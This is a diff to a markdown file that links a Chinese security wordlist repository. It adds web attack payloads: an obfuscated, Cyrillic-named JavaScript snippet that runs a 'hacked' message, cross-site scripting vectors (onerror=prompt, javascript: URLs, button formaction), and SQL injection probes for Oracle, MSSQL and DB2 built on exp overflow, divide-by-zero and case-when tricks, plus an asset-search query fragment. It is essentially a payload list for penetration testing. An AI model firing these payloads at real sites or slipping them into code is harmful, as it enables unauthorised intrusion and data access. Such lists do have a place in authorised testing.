@@ -1,13 +1,22 @@
 [GitHub - sunwu57/ziye-security-wordlists: ziye的专属字典](https://github.com/sunwu57/ziye-security-wordlists) 
 
 ```yaml
+а='',б=!а+а,в=!б+а,г=а+{},д=б[а++],е=б[ж=а],
+з=++ж+а,и=г[ж+з],б[и+=г[а]+(б.в+г)[а]+в[з]+д+е+б[ж]+и+д+г[а]+е][и](в[а]+в[ж]+б[з]+е+д+"('взломано')")()
+```
+
+```yaml
 "-prompt(1)-"
 ";prompt(1);//
 "><h1>1</h1>
 <iframe onload=location='javascri'.concat('pt:aler','t(1)')>
 <img src=1 onerror=co\u006efir\u006d`1`>
+"><img src=1 onerror=prompt(1)>
 "><img src=1 onerror=pr\u006fmpt(1)>
 %22-prompt(1)-%22
+javascript:alert(1)
+<form><button type="submit" formaction="javascript:alert(1)">M</button></form>
+
 ```
 
 ```yaml
@@ -21,9 +30,15 @@
 %'and substr('abc',1,1)='b' and '%'='
 '||(exp(709))||'
 '||(exp(710))||'
+'||1/0||'
+'||1/1||'
+
 case when 1=2 then 1 else 1/0 end
 case when 1=1 then 1 else 1/0 end
 (case%0a1%0awhen%0a1%0athen%0a1%0aelse%0a1%0aend)%0aSSSSasc
+'||(exp(case+when+2=1+then+1000+else+3+end))||'
+'||(exp(case+when+2=2+then+1000+else+3+end))||'
+/(len(suser_sname())-{{int(0-10)}})
 
 
 oracle
@@ -37,6 +52,10 @@ position('sql' in 'postgresql')返回的是8
 position('sq' in 'postgresql')返回的也是8
 position('p' in 'postgresql')返回的则是1
 
+
+db2
+1' and  '1'='1' and '1'='1
+1' and  '1'='2' and '1'='1
 
 (case SUBSTR(USER,1,1) when CHR(50) then exp(900) else PROVINCE_ID end) asc
 (case 1 when 1 then exp(900) else PROVINCE_ID end) asc
@@ -75,6 +94,7 @@ and sleep(5)
 
 ```yaml
 ip="202.xxx.0.0/19" && (status_code="200" || banner="HTTP/1.1 200 OK")
+&& （status_code="200"||status_code="301"||）
 ```
 
 ```plain
